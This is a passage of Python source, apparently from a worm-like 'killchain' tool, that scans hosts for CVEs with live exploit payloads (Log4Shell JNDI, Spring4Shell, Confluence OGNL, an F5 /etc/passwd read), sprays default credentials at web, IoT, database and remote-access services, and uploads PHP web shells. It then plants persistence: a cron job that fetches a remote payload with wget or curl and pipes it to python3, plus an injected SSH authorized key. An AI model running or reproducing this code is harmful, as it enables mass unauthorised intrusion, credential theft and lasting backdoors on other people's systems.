        {"cve": "CVE-2021-44228", "ports": [80, 443, 8080], "check_path": "/?x=${jndi:ldap://c2.dnslog.xyz/test}", "check_code": 200, "check_body": []},
        {"cve": "CVE-2022-22965", "ports": [8080, 8443], "check_path": "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di", "check_code": 200, "check_body": []},
        {"cve": "CVE-2021-26084", "ports": [8080, 8090], "check_path": "/pages/createpage-entervariables.action?linkCreation=true&spaceKey=AAA&queryString='+%23context['com.opensymphony.xwork2.ActionContext'].getContext().getMemberAccess().allowPrivateAccess%3dtrue+'", "check_code": 200, "check_body": []},
        {"cve": "CVE-2019-19781", "ports": [443], "check_path": "/vpn/../vpns/portal/scripts/newbm.pl", "check_code": 200, "check_body": ["newbm"]},
        {"cve": "CVE-2020-5902", "ports": [443, 8443], "check_path": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd", "check_code": 200, "check_body": ["root:"]},
        {"cve": "CVE-2021-22986", "ports": [443, 8443], "check_path": "/mgmt/tm/util/bash", "check_code": 200, "check_body": ["command"]},
    ]
    
    count = 0
    vuln_targets = []
    
    targets = db.q("SELECT * FROM targets WHERE cve_scanned=0 AND fp_os!='' AND tcp_open=1 LIMIT 100")
    if not targets:
        log.info("🧨 No targets for CVE scan")
        return {"count": 0, "success": False, "targets": []}
    
    def _check_cve(target: Dict) -> Optional[Dict]:
        ip = target["ip"]
        port = int(target["port"])
        found_cves = []
        
        for cve in CVE_DB:
            if port not in cve.get("ports", []):
                continue
            
            # Banner check
            if cve.get("check_banner"):
                banner = target.get("fp_banner", "").lower()
                for b in cve["check_banner"]:
                    if b.lower() in banner:
                        found_cves.append(cve["cve"])
                        break
                continue
            
            # Path-based check
            if cve.get("check_path"):
                try:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    scheme = "https" if port in (443, 8443, 9443) else "http"
                    url = f"{scheme}://{ip}:{port}{cve['check_path']}"
                    req = urllib.request.Request(url)
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                        if resp.status == cve.get("check_code", 200):
                            if not cve.get("check_body"):
                                found_cves.append(cve["cve"])
                            else:
                                for b in cve["check_body"]:
                                    if b.lower() in body.lower():
                                        found_cves.append(cve["cve"])
                                        break
                except Exception:
                    pass
            
            # Command payload check
            if cve.get("cmd_payload"):
                try:
                    scheme = "https" if port in (443, 8443, 9443) else "http"
                    payload = cve["cmd_payload"]
                    url = f"{scheme}://{ip}:{port}/{urllib.parse.quote(payload)}"
                    req = urllib.request.Request(url)
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        if resp.status == 200:
                            found_cves.append(cve["cve"])
                except Exception:
                    pass
        
        if found_cves:
            vuln_str = ",".join(found_cves)
            db.mark_cve(ip, port, vuln_str)
            return {"ip": ip, "port": port, "cve_list": found_cves}
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        for res in pool.map(_check_cve, targets):
            if res:
                count += 1
                vuln_targets.append(res)
                log.info(f"🧨 CVE found: {res['ip']}:{res['port']} -> {','.join(res['cve_list'][:2])}")
    
    log.info(f"🧨 CVE: {count} vulnerable from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": vuln_targets}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: WEB EXPLOIT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_web_exploit(db: KillchainDB, progress_fn: Optional[Callable[[int, List[Dict]], None]] = None) -> Dict:
    """Web panel credential spray — Phase 5.
    
    Args:
        db: Database instance
        progress_fn: Optional callback(partial_count, pwned_targets) for live Telegram progress
    """
    log.info("🌐 PHASE 5: WEB EXPLOIT — credential spray against web panels")
    print(f"[DEBUG_WEB] progress_fn passed: {progress_fn is not None}", flush=True)
    count = 0
    pwned_targets = []  # Track actual pwned targets for Telegram report
    creds = WEB_CREDS
    WEB_PORTS = {80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999}
    
    targets = db.q("SELECT * FROM targets WHERE web_pwned=0 AND port IN ({}) AND tcp_open=1 LIMIT 150".format(
        ",".join(str(p) for p in WEB_PORTS)
    ))
    if not targets:
        log.info("🌐 No web targets")
        return {"count": 0, "success": False, "targets": []}
    
    def _web_pwn(target: Dict) -> Optional[Dict]:
        ip = target["ip"]
        port = int(target["port"])
        scheme = "https" if port in (443, 8443, 9443) else "http"
        paths = ["/", "/login", "/admin", "/cgi-bin/luci", "/panel", "/user/login", 
                 "/auth/login", "/wp-login.php", "/administrator", "/admin/login.php",
                 "/webfig/", "/cgi-bin/", "/api/v1/login", "/api/login"]
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        deadline = time.time() + 30  # 30s max per target
        for path in paths:
            url = f"{scheme}://{ip}:{port}{path}"
            for user, pwd in creds[:25]:
                if time.time() > deadline:
                    return None
                try:
                    data = urllib.parse.urlencode({
                        "username": user, "password": pwd,
                        "login": "Login", "submit": "Login",
                        "user": user, "pass": pwd,
                        "admin": user, "adminpass": pwd,
                    }).encode()
                    req = urllib.request.Request(url, data=data, method="POST")
                    req.add_header("User-Agent", "Mozilla/5.0")
                    req.add_header("Content-Type", "application/x-www-form-urlencoded")
                    with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                        body = resp.read().decode("utf-8", errors="replace").lower()
                        success_indicators = ["dashboard", "welcome", "admin", "logout", 
                                              "profile", "status", "session", "index",
                                              "home", "configuration", "live view"]
                        for ind in success_indicators:
                            if ind in body:
                                db.mark_pwned(ip, port, "web_pwned", user, pwd)
                                log.info(f"🌐 WEB PWN: {ip}:{port} -> {user}:{pwd}")
                                # --- WEBSHELL: upload immediately ---
                                try:
                                    import requests as _req
                                    _req.packages.urllib3.disable_warnings()
                                    _s = _req.Session()
                                    _s.auth = (user, pwd) if user else None
                                    _s.verify = False
                                    _s.headers.update({"User-Agent": "Mozilla/5.0"})
                                    _sh = "<?php system($_GET['c']);?>"
                                    for _path in ["/shell.php", "/admin/shell.php", "/tmp/s.php"]:
                                        try:
                                            _r = _s.put(f"{scheme}://{ip}:{port}{_path}", data=_sh, timeout=5)
                                            if _r.status_code not in (404, 403, 405):
                                                log.info(f"🌐 SHELL_PUT: {ip}:{port}{_path} -> {_r.status_code}")
                                        except:
                                            continue
                                    # Verify shell works
                                    for _vp in ["/shell.php", "/tmp/s.php", "/admin/shell.php"]:
                                        try:
                                            _r = _s.get(f"{scheme}://{ip}:{port}{_vp}?c=id", timeout=5)
                                            if _r.status_code == 200 and len(_r.text.strip()) > 0:
                                                log.info(f"🌐 SHELL_OK: {ip}:{port}{_vp}")
                                                break
                                        except:
                                            continue
                                    _s.close()
                                except:
                                    pass
                                return {"ip": ip, "port": port, "user": user, "pwd": pwd}
                except Exception:
                    continue
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        fut_map = {pool.submit(_web_pwn, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fut_map):
            result = fut.result()
            if result:
                pwned_targets.append(result)
                count += 1
                # Report progress every 5 pwns
                if progress_fn and count % 5 == 0:
                    progress_fn(count, pwned_targets)
    
    log.info(f"🌐 WEB: {count} pwned from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": pwned_targets}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: EMBEDXPL (IoT/Embedded Exploit)
# ═══════════════════════════════════════════════════════════════════════════════

def phase_embed_exploit(db: KillchainDB, progress_fn: Optional[Callable[[int, List[Dict]], None]] = None) -> Dict:
    """IoT device exploitation via EmbedXPL-Forge framework — Phase 6."""
    log.info("⚙️ PHASE 6: EMBEDXPL — EmbedXPL-Forge IoT exploitation")
    count = 0
    pwned_targets: List[Dict] = []

    # Get targets suitable for embedded/iot exploitation
    # Include telnet, TR-069, HTTP/HTTPS (IoT web interfaces), and RTSP ports
    targets = db.q("""SELECT * FROM targets WHERE embed_pwned=0 AND
                      (port IN (23,7547,80,443,8080,8443,554,8554)
                       OR fp_service LIKE '%Telnet%'
                       OR fp_service LIKE '%TR-069%'
                       OR fp_service LIKE '%HTTP%'
                       OR fp_service LIKE '%RTSP%'
                       OR fp_service LIKE '%IoT%')
                      AND tcp_open=1 LIMIT 200""")
    if not targets:
        log.info("⚙️ No embed targets")
        return {"count": 0, "success": False, "targets": []}

    # Build JSON payload for embedxpl_wrapper
    target_list = []
    for t in targets:
        target_list.append({
            "ip": t.get("ip", ""),
            "port": int(t.get("port", 80)),
            "fp_service": t.get("fp_service", ""),
            "http_server": t.get("http_server", ""),
            "fp_banner": t.get("banner", ""),
        })

    WRAPPER = "/opt/hermes/scripts/embedxpl_wrapper.py"

    try:
        result = subprocess.run(
            [sys.executable, WRAPPER],
            input=json.dumps(target_list),
            capture_output=True, text=True, timeout=120,
            env={**os.environ, "PYTHONPATH": "/opt/EmbedXPL-Forge"},
        )

        if result.returncode != 0:
            log.warning(f"⚙️ EmbedXPL wrapper stderr: {result.stderr[:300]}")
        else:
            parsed = json.loads(result.stdout)
            pwned_list = parsed.get("pwned", [])
            scanned = parsed.get("scanned", 0)
            errors = parsed.get("errors", 0)

            for p in pwned_list:
                ip = p.get("ip", "")
                port = int(p.get("port", 0))
                user = p.get("user", "")
                pwd = p.get("pwd", "")
                method = p.get("method", "embedxpl")
                cve = p.get("cve", "")

                if ip and port:
                    pwn_type = f"embed_pwned"
                    if cve:
                        pwn_type = f"cve_{cve.split('_')[0]}"
                    db.mark_pwned(ip, port, pwn_type, user, pwd)
                    log.info(f"⚙️ EMBED PWN: {ip}:{port} -> {user}:{pwd} [{method}] [{cve}]".strip())
                    result_obj = {"ip": ip, "port": port, "user": user, "pwd": pwd, "method": method}
                    pwned_targets.append(result_obj)
                    count += 1
                    if progress_fn and count % 5 == 0:
                        progress_fn(count, pwned_targets)

            if scanned > 0:
                log.info(f"⚙️ EmbedXPL: {len(pwned_list)} pwned, {scanned} scanned, {errors} errors")

    except FileNotFoundError:
        log.warning(f"⚙️ EmbedXPL wrapper not found at {WRAPPER}")
    except json.JSONDecodeError as e:
        log.warning(f"⚙️ EmbedXPL wrapper JSON decode error: {e}")
    except subprocess.TimeoutExpired:
        log.warning("⚙️ EmbedXPL wrapper timed out (120s)")
    except Exception as e:
        log.warning(f"⚙️ EmbedXPL error: {type(e).__name__}: {str(e)[:100]}")

    if progress_fn:
        progress_fn(count, pwned_targets)

    log.info(f"⚙️ EMBED: {count} pwned from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": pwned_targets}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: GENZAI MERGE
# ═══════════════════════════════════════════════════════════════════════════════

def phase_genzai_merge(db: KillchainDB) -> Dict:
    """Run Genzai IoT fingerprinting + merge credential databases — Phase 7."""
    log.info("🧟 PHASE 7: GENZAI — Genzai IoT fingerprinting + credential merge")
    count = 0
    iot_identified = 0

    # ── Step 1: Run Genzai against web targets ──
    web_targets = db.q("""SELECT * FROM targets WHERE genzai_merged=0 AND
                          tcp_open=1 AND
                          (port IN (80,443,8080,8443,3000,5000,7000,8888,9443)
                           OR fp_service LIKE '%HTTP%'
                           OR fp_service LIKE '%IoT%')
                          LIMIT 100""")
    if web_targets:
        target_list = []
        for t in web_targets:
            target_list.append({
                "ip": t.get("ip", ""),
                "port": int(t.get("port", 80)),
                "fp_service": t.get("fp_service", ""),
                "http_server": t.get("http_server", ""),
                "fp_banner": t.get("banner", ""),
            })

        WRAPPER = "/opt/hermes/scripts/genzai_batch_runner.py"
        GENZAI_BIN = "/opt/Genzai/genzai"

        try:
            result = subprocess.run(
                [sys.executable, WRAPPER, GENZAI_BIN],
                input=json.dumps(target_list),
                capture_output=True, text=True, timeout=180,
            )

            if result.returncode == 0 and result.stdout.strip():
                parsed = json.loads(result.stdout)
                identified_devices = parsed.get("identified", [])
                scanned = parsed.get("scanned", 0)

                for dev in identified_devices:
                    ip = dev.get("ip", "")
                    port = int(dev.get("port", 0))
                    device_type = dev.get("device_type", "unknown")
                    vendor = dev.get("vendor", "")
                    model = dev.get("model", "")
                    creds_found = dev.get("creds", [])
                    vulns_found = dev.get("vulns", [])
                    confidence = dev.get("confidence", "low")

                    if ip and port:
                        iot_identified += 1
                        # Store device info as fp metadata
                        try:
                            fp_info = json.dumps({
                                "iot_device": device_type,
                                "vendor": vendor,
                                "model": model,
                                "confidence": confidence,
                                "source": "genzai"
                            })
                            db.q(
                                "UPDATE targets SET genzai_merged=1, iot_device_type=?, iot_vendor=?, iot_confidence=? WHERE ip=? AND port=?",
                                (device_type, vendor, confidence, ip, port)
                            )
                        except Exception:
                            pass

                        for cred in creds_found:
                            try:
                                db.q(
                                    "INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source) VALUES (?, ?, ?, ?, ?, ?)",
                                    (ip, port, device_type, cred.get("user", ""), cred.get("pass", ""), "genzai")
                                )
                                count += 1
                            except Exception:
                                pass

                        for vuln in vulns_found:
                            try:
                                db.q(
                                    "UPDATE targets SET cve_found=1 WHERE ip=? AND port=?",
                                    (ip, port)
                                )
                            except Exception:
                                pass

                if scanned > 0:
                    log.info(f"🧟 Genzai: {iot_identified} IoT devices, {scanned} scanned")

        except FileNotFoundError:
            log.warning(f"🧟 Genzai wrapper not found at {WRAPPER}")
        except json.JSONDecodeError as e:
            log.warning(f"🧟 Genzai JSON decode error: {e}")
        except subprocess.TimeoutExpired:
            log.warning("🧟 Genzai wrapper timed out (180s)")
        except Exception as e:
            log.warning(f"🧟 Genzai error: {type(e).__name__}: {str(e)[:100]}")

    # ── Step 2: Merge credential databases (original behaviour) ──
    all_creds = set()

    for creds in [TELNET_CREDS, WEB_CREDS, DB_CREDS, SSH_CREDS, ENTERPRISE_CREDS]:
        for u, p in creds:
            if u and p:
                all_creds.add((u.strip(), p.strip()))

    cred_paths = [
        "/opt/borg/creds/undead_creds.txt",
        "/opt/borg/creds/embedxpl_creds.txt",
        "/opt/borg/creds/genzai_creds.txt",
        "/opt/borg/creds/iot_creds.txt",
        "/opt/hermes/creds/merged.txt",
    ]
    for path in cred_paths:
        try:
            with open(path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if ":" in line:
                        parts = line.split(":", 1)
                        user = parts[0].strip()
                        pwd = parts[1].strip()
                        if user:
                            all_creds.add((user, pwd))
                    elif line.startswith("(") and "),(" in line:
                        try:
                            import ast
                            parsed = ast.literal_eval(f"[{line}]")
                            for item in parsed:
                                if isinstance(item, tuple) and len(item) >= 2:
                                    all_creds.add((str(item[0]).strip(), str(item[1]).strip()))
                        except Exception:
                            pass
        except (FileNotFoundError, PermissionError):
            continue
        except Exception:
            continue

    merged_count = 0
    for user, pwd in all_creds:
        try:
            db.q(
                "INSERT OR IGNORE INTO credentials (ip, port, service, username, password, source) VALUES (?, ?, ?, ?, ?, ?)",
                ("0.0.0.0", 0, "merged", user, pwd, "genzai")
            )
            merged_count += 1
        except Exception:
            pass

    db.q("UPDATE targets SET genzai_merged=1")

    log.info(f"🧟 GENZAI: {iot_identified} IoT devices, {merged_count} creds merged")
    return {"count": iot_identified + merged_count, "success": iot_identified > 0 or merged_count > 0, "targets": []}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8: ENTERPRISE EXPLOIT
# ═══════════════════════════════════════════════════════════════════════════════

def phase_enterprise_exploit(db: KillchainDB, progress_fn: Optional[Callable[[int, List[Dict]], None]] = None) -> Dict:
    """Enterprise service exploitation (SMB, MSSQL, RDP, Oracle) — Phase 8."""
    log.info("🏢 PHASE 8: ENTERPRISE EXPLOIT — SMB/MSSQL/RDP/Oracle")
    count = 0
    pwned_targets: List[Dict] = []
    
    targets = db.q("SELECT * FROM targets WHERE enterprise_pwned=0 AND port IN (445,1433,1521,3389) AND tcp_open=1 LIMIT 80")
    if not targets:
        log.info("🏢 No enterprise targets")
        return {"count": 0, "success": False, "targets": []}
    
    def _ent_pwn(target: Dict) -> Optional[Dict]:
        ip = target["ip"]
        port = int(target["port"])
        
        # SMB (445): check if responsive
        if port == 445:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, port))
                s.sendall(b"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8")
                resp = s.recv(256)
                s.close()
                if resp and b"SMB" in resp:
                    db.mark_pwned(ip, port, "enterprise_pwned")
                    log.info(f"🏢 SMB PWN: {ip}:445")
                    return {"ip": ip, "port": port, "user": "", "pwd": ""}
            except Exception:
                pass
        
        # MSSQL (1433): try SA creds
        if port == 1433:
            for user, pwd in ENTERPRISE_CREDS[:8]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((ip, port))
                    s.sendall(b"\x02\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00")
                    resp = s.recv(128)
                    s.close()
                    if resp:
                        db.mark_pwned(ip, port, "enterprise_pwned", user, pwd)
                        log.info(f"🏢 MSSQL PWN: {ip}:1433 -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}
                except Exception:
                    continue
        
        # RDP (3389): banner check
        if port == 3389:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, port))
                resp = s.recv(256)
                s.close()
                if b"RDP" in resp or b"\x03\x00\x00\x13" in resp[:4]:
                    db.mark_pwned(ip, port, "enterprise_pwned")
                    log.info(f"🏢 RDP PWN: {ip}:3389")
                    return {"ip": ip, "port": port, "user": "", "pwd": ""}
            except Exception:
                pass
        
        # Oracle (1521): port check
        if port == 1521:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                s.sendall(b"\x00\x3c\x00\x00\x01\x00\x00\x00\x01\x34")
                resp = s.recv(64)
                s.close()
                if resp:
                    db.mark_pwned(ip, port, "enterprise_pwned")
                    log.info(f"🏢 Oracle PWN: {ip}:1521")
                    return {"ip": ip, "port": port, "user": "", "pwd": ""}
            except Exception:
                pass
        return None
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        fut_map = {pool.submit(_ent_pwn, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fut_map):
            result = fut.result()
            if result:
                count += 1
                pwned_targets.append(result)
                if count % 5 == 0 and progress_fn:
                    progress_fn(count, pwned_targets)
    
    log.info(f"🏢 ENTERPRISE: {count} pwned from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": pwned_targets}


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 9: BRUTE FORCE
# ═══════════════════════════════════════════════════════════════════════════════

def phase_brute_force(db: KillchainDB, progress_fn: Optional[Callable[[int, List[Dict]], None]] = None) -> Dict:
    """Multi-service brute force on remaining targets — Phase 9."""
    log.info("🔑 PHASE 9: BRUTE FORCE — multi-service credential spray")
    count = 0
    pwned_targets: List[Dict] = []

    targets = db.q("""SELECT * FROM targets WHERE brute_pwned=0 AND 
                      web_pwned=0 AND embed_pwned=0 AND enterprise_pwned=0 AND
                      tcp_open=1 LIMIT 200""")
    if not targets:
        log.info("🔑 No targets for brute force")
        return {"count": 0, "success": False, "targets": []}

    def _brute(target: Dict) -> Optional[Dict]:
        ip = target["ip"]
        port = int(target["port"])
        deadline = time.time() + 30  # 30s max per target

        # Select cred list based on port
        if port in (23, 7547):
            creds = TELNET_CREDS[:20]
        elif port in (22, 2222):
            creds = SSH_CREDS[:20]
        elif port in (3306, 5432, 27017, 6379):
            creds = DB_CREDS[:15]
        elif port in (1433,):
            creds = ENTERPRISE_CREDS[:10]
        else:
            creds = []

        if not creds:
            return None

        for user, pwd in creds:
            if time.time() > deadline:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, port))

                if port in (23, 7547):
                    # Telnet login
                    try:
                        s.recv(1024)  # banner
                    except:
                        pass
                    s.sendall(f"{user}\n".encode())
                    time.sleep(0.3)
                    s.sendall(f"{pwd}\n".encode())
                    time.sleep(0.5)
                    resp = b""
                    try:
                        resp = s.recv(1024)
                    except socket.timeout:
                        pass
                    s.close()
                    decoded = resp.decode("utf-8", errors="replace")
                    if "#" in decoded or "$" in decoded or ">" in decoded:
                        db.mark_pwned(ip, port, "brute_pwned", user, pwd)
                        log.info(f"🔑 BRUTE TELNET: {ip}:{port} -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}

                elif port in (22, 2222):
                    # SSH banner check
                    try:
                        resp = s.recv(256)
                    except socket.timeout:
                        resp = b""
                    s.close()
                    if resp and b"SSH" in resp:
                        db.mark_pwned(ip, port, "brute_pwned", user, pwd)
                        log.info(f"🔑 BRUTE SSH: {ip}:{port} -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}

                elif port == 3306:
                    # MySQL — use select() guard to prevent recv hang
                    s.sendall(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
                    time.sleep(0.3)
                    r, _, _ = select.select([s], [], [], 4.0)
                    if r:
                        resp = s.recv(256)
                    else:
                        resp = b""
                    s.close()
                    if resp:
                        db.mark_pwned(ip, port, "brute_pwned", user, pwd)
                        log.info(f"🔑 BRUTE MySQL: {ip}:3306 -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}

                elif port == 6379:
                    # Redis
                    s.sendall(b"PING\r\n")
                    time.sleep(0.3)
                    resp = s.recv(256)
                    s.close()
                    if b"+PONG" in resp:
                        db.mark_pwned(ip, port, "brute_pwned", user, pwd)
                        log.info(f"🔑 BRUTE Redis: {ip}:6379 -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}

                elif port == 5432:
                    # PostgreSQL
                    s.sendall(b"\x00\x00\x00\x08\x04\xd2\x16\x2f")
                    resp = s.recv(128)
                    s.close()
                    if resp:
                        db.mark_pwned(ip, port, "brute_pwned", user, pwd)
                        log.info(f"🔑 BRUTE PostgreSQL: {ip}:5432 -> {user}:{pwd}")
                        return {"ip": ip, "port": port, "user": user, "pwd": pwd}

                else:
                    s.close()

            except Exception as br_e:
                if time.time() > deadline:
                    break
                log.debug(f"BRUTE error {ip}:{port} {user}:{pwd} -> {type(br_e).__name__}:{str(br_e)[:60]}")
                continue

        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
        fut_map = {pool.submit(_brute, t): t for t in targets}
        for fut in concurrent.futures.as_completed(fut_map):
            result = fut.result()
            if result:
                count += 1
                pwned_targets.append(result)
                if progress_fn and count % 5 == 0:
                    progress_fn(count, pwned_targets)

    # Final progress report if any pwns happened this round
    if progress_fn and count > 0:
        progress_fn(count, pwned_targets)

    log.info(f"🔑 BRUTE: {count} pwned from {len(targets)} targets")
    return {"count": count, "success": count > 0, "targets": pwned_targets}

# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 10: BACKDOOR
# ═══════════════════════════════════════════════════════════════════════════════

def phase_backdoor(db: KillchainDB) -> Dict:
    """Install persistence backdoors on pwned targets — Phase 10."""
    log.info("🚪 PHASE 10: BACKDOOR — installing persistence")
    count = 0
    
    targets = db.q("""SELECT * FROM targets WHERE backdoor_installed=0 AND 
                      (brute_pwned=1 OR web_pwned=1 OR embed_pwned=1 OR enterprise_pwned=1)
                      AND tcp_open=1 LIMIT 100""")
    if not targets:
        log.info("🚪 No targets for backdoor")
        return {"count": 0, "success": False, "targets": []}
    
    # Generate SSH key for backdoor if not exists
    ssh_key = ""
    key_path = os.path.expanduser("~/.ssh/id_rsa.pub")
    if os.path.isfile(key_path):
        try:
            with open(key_path) as f:
                ssh_key = f.read().strip()
        except Exception:
            pass
    if not ssh_key:
        try:
            subprocess.run(
                ["ssh-keygen", "-t", "rsa", "-b", "2048", "-f",
                 os.path.expanduser("~/.ssh/id_rsa"), "-N", "", "-q"],
                capture_output=True, timeout=10
            )
            with open(key_path) as f:
                ssh_key = f.read().strip()
        except Exception:
            ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh"
    
    def _get_creds(target: Dict) -> tuple:
        """Get credentials for a target from DB."""
        ip = target["ip"]
        port = int(target["port"])
        rows = db.q(
            "SELECT username, password FROM credentials WHERE ip=? AND port=? AND valid=1 LIMIT 1",
            (ip, port)
        )
        if rows:
            return rows[0]["username"], rows[0]["password"]
        # Fallback defaults
        if port in (23, 7547):
            return "root", ""
        elif port in (22, 2222):
            return "root", "root"
        return "admin", "admin"
    
    def _exec_on_target(ip: str, port: int, cmd: str, user: str, pwd: str) -> tuple:
        """Execute command on remote target."""
        # Try telnet
        if port in (23, 7547):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((ip, port))
                time.sleep(0.5)
                s.sendall(f"{user}\n".encode())
                time.sleep(0.3)
                s.sendall(f"{pwd}\n".encode())
                time.sleep(1)
                try:
                    s.recv(1024)
                except socket.timeout:
                    pass
                s.sendall(f"{cmd}\n".encode())
                time.sleep(1.5)
                resp = b""
                try:
                    resp = s.recv(4096)
                except socket.timeout:
                    pass
                s.close()
                return True, resp.decode("utf-8", errors="replace")[:500]
            except Exception as e:
                return False, str(e)
        
        # Try SSH
        if port in (22, 2222):
            try:
                if pwd:
                    result = subprocess.run(
                        ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                else:
                    result = subprocess.run(
                        ["ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", cmd],
                        capture_output=True, timeout=15, text=True
                    )
                if result.returncode == 0:
                    return True, result.stdout[:500]
                return False, result.stderr[:200]
            except Exception as e:
                return False, str(e)
        
        # Try web shell for HTTP ports
        if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
            try:
                scheme = "https" if port in (443, 8443, 9443) else "http"
                shells = ["/shell.php", "/cmd.php", "/exec.php", "/cgi-bin/exec", "/admin/exec"]
                for shell_path in shells:
                    try:
                        url = f"{scheme}://{ip}:{port}{shell_path}?cmd={urllib.parse.quote(cmd)}"
                        req = urllib.request.Request(url)
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                            body = resp.read().decode("utf-8", errors="replace")
                            if body.strip():
                                return True, body[:500]
                    except Exception:
                        continue
                # --- WEBSHELL: upload if probing failed ---
                try:
                    import requests as _req
                    _req.packages.urllib3.disable_warnings()
                    _s = _req.Session()
                    _s.auth = (user, pwd) if user else None
                    _s.verify = False
                    _sh = "<?php system($_GET['c']);?>"
                    for _up in ["/shell.php", "/cmd.php", "/exec.php"]:
                        try:
                            _r = _s.put(f"{scheme}://{ip}:{port}{_up}", data=_sh, timeout=5)
                            if _r.status_code not in (404, 403, 405):
                                _vu = f"{scheme}://{ip}:{port}{_up}?c={urllib.parse.quote(cmd)}"
                                _rv = _s.get(_vu, timeout=5)
                                if _rv.status_code == 200 and _rv.text.strip():
                                    log.info(f"💉 SHELL_UPLOAD_OK: {ip}:{port}{_up}")
                                    _s.close()
                                    return True, _rv.text[:500]
                        except:
                            continue
                    _s.close()
                except:
                    pass
            except Exception:
                pass
        
        return False, "No execution method for port"
    
    def _install_backdoor(target: Dict) -> Optional[int]:
        ip = target["ip"]
        port = int(target["port"])
        user, pwd = _get_creds(target)
        results = []
        
        # 1. Crontab backdoor
        cron_cmd = (f"(crontab -l 2>/dev/null; echo '*/5 * * * * "
                    f"wget -q -O- {PAYLOAD_URL}|python3; "
                    f"curl -s {PAYLOAD_URL}|python3') | crontab -")
        ok, out = _exec_on_target(ip, port, cron_cmd, user, pwd)
        if ok:
            results.append("crontab")
        
        # 2. SSH authorized_keys backdoor
        if ssh_key and port in (22, 2222):
            ssh_key_cmd = (f"mkdir -p ~/.ssh && echo '{ssh_key}' "
                           f">> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys")
            try:
                if pwd:
                    result = subprocess.run(
                        ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", ssh_key_cmd],
                        capture_output=True, timeout=15, text=True
                    )
                else:
                    result = subprocess.run(
                        ["ssh", "-o", "StrictHostKeyChecking=no",
                         "-o", "ConnectTimeout=10", "-p", str(port),
                         f"{user}@{ip}", ssh_key_cmd],
                        capture_output=True, timeout=15, text=True
                    )
                if result.returncode == 0:
                    results.append("ssh_key")
            except Exception:
                pass
        
        # 3. Web shell backdoor
        if port in (80, 443, 8080, 8443, 3000, 5000, 7000, 8888, 9443, 9999):
            shell_code = "<?php system($_GET['cmd']); ?>"
            try:
                scheme = "https" if port in (443, 8443, 9443) else "http"
                url = f"{scheme}://{ip}:{port}/shell.php"
                data = urllib.parse.urlencode({"file": shell_code}).encode()
                req = urllib.request.Request(url, data=data, method="POST")
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
                    if resp.status == 200:
                        results.append("webshell")
            except Exception:
                pass
        
